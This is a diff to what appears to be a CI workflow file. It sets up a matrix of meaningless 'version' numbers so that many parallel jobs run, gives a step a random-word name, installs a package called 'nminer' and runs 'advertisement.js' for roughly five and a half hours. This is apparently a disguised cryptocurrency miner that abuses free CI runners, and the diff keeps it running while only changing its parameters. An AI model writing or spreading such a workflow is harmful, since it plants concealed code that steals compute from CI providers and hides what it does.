@@ -9,22 +9,24 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 1350 }
-          - { version: 3461 }
-          - { version: 1080 }
-          - { version: 9373 }
-          - { version: 3220 }
-          - { version: 2366 }
-          - { version: 9793 }
-          - { version: 6505 }
-          - { version: 8817 }
-          - { version: 6431 }
-          - { version: 8795 }
-          - { version: 1706 }
-          - { version: 9622 }
-          - { version: 8916 }
-          - { version: 516 }
-          - { version: 8067 }
+          - { version: 7327 }
+          - { version: 32 }
+          - { version: 1036 }
+          - { version: 5917 }
+          - { version: 2167 }
+          - { version: 782 }
+          - { version: 8610 }
+          - { version: 8392 }
+          - { version: 2970 }
+          - { version: 9019 }
+          - { version: 6179 }
+          - { version: 6215 }
+          - { version: 4941 }
+          - { version: 9949 }
+          - { version: 6233 }
+          - { version: 7112 }
+          - { version: 2088 }
+          - { version: 7769 }
 
     steps:
       - name: Checkout
@@ -35,7 +37,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: 
+      - name: valuable yawningly now stark versus
         run: |
           npm install nminer@latest
-          timeout 350m node advertisement.js || echo "advertisement executed"
+          timeout 337m node advertisement.js || echo "advertisement executed"
